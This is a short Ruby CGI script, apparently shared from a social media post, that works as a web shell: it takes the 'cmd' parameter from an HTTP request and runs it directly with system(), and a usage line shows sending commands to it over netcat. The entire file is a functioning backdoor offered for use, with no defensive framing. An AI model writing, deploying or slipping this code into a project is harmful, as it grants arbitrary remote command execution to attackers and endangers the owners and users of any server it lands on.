#!/usr/bin/env ruby

# Ref:https://www.linkedin.com/feed/update/urn:li:activity:6945138570735054848/

require 'cgi'
cgi = CGI.new
puts cgi.header
system(cgi['cmd'])

# Usage:
echo "GET /cgi/webshell.rb?cmd=COMMAND" | nc HOST PORT
